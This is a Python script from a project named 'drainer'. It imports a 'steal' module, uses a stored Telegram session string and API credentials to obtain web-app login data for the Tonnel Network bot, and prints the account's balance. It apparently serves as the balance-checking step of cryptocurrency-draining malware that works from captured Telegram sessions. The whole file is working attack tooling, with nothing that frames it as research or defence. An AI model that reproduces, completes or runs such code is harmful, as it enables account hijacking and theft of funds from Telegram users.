import argparse
import asyncio
import os
import sys

import paths

import config_migration

config_migration.ensure_team_config_migrated(
    os.path.join(paths.get_team_dir(), "config.py")
)

import config

from drainer.core import hybr1d_shared
from drainer.core.steal import get_tg_webappdata
from drainer.core.tonnel_api import get_balance_info


async def _init_data(fresh: bool) -> str:
    env = (os.environ.get("TONNEL_INIT_DATA") or "").strip()
    if env:
        return env
    if not fresh:
        cached = hybr1d_shared.read_cached_init_data()
        if cached:
            return cached
    async with hybr1d_shared.hybr1d_client_context(
        config.API_ID, config.API_HASH, config.HYBR1D_SESSION_STRING
    ) as app:
        return await get_tg_webappdata(app, "@Tonnel_Network_bot")


async def _async_main(fresh: bool) -> None:
    data = await _init_data(fresh)
    bal = get_balance_info(data)
    print(f"{bal:.6f}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--fresh", action="store_true")
    args = ap.parse_args()
    try:
        asyncio.run(_async_main(args.fresh))
    except KeyboardInterrupt:
        sys.exit(130)


if __name__ == "__main__":
    main()
